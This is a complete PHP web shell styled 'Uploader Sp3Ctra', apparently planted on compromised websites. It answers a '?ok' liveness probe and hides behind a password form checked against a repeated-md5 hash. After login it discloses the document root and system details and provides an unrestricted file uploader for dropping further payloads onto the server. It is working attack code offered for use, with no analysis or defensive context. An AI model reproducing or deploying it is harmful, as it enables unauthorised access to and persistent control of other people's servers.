<?php ?><?php if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) {
  session_start();
  if (!isset($_SESSION['secretyt'])) {
    $_SESSION['secretyt'] = false;
  }
  if (!$_SESSION['secretyt']) {
    if (isset($_POST['pwdyt']) && md5(md5(md5(md5(md5(md5(md5(md5($_POST['pwdyt'])))))))) == '2dec0af1d2efe0804b3b28bb0efa51c3') {
      $_SESSION['secretyt'] = true;
    } else {
$bytesecform = <<<FORM
<html>
  <head>
    <meta charset="utf-8">
    <title></title>
    <style type="text/css">
      body {padding:10px}
      input {
        padding: 2px;
        display:inline-block;
        margin-right: 5px;
      }
    </style>
  </head>
  <body>
    <form action="" method="post" accept-charset="utf-8">
      <input type="password" name="pwdyt" value="" placeholder="passwd">
      <input type="submit" name="submit" value="submit">
    </form>
  </body>
</html>
FORM;
      die($bytesecform);
    }
  }
}
?>
<?php
echo "<title>Uploader Sp3Ctra</title><b>Sp3Ctra :===>>> ./Yonko  </b></br>".$_SERVER['DOCUMENT_ROOT']."</br>".php_uname();   
$cwd = getcwd(); 
Echo '<center>  <form method="post" target="_self" enctype="multipart/form-data">  
<input type="file" size="20" name="uploads" /> <input type="submit" value="upload" />  
</form>  </center></td></tr> </table><br>'; 
if (!empty ($_FILES['uploads'])) {     
    move_uploaded_file($_FILES['uploads']['tmp_name'],$_FILES['uploads']['name']);     
    Echo "<script>alert('upload Done');       
    </script><b>Uploaded !!!</b><br>name : ".$_FILES['uploads']['name']."<br>size : ".$_FILES['uploads']['size']."<br>type : ".$_FILES['uploads']['type']; } ; 
?>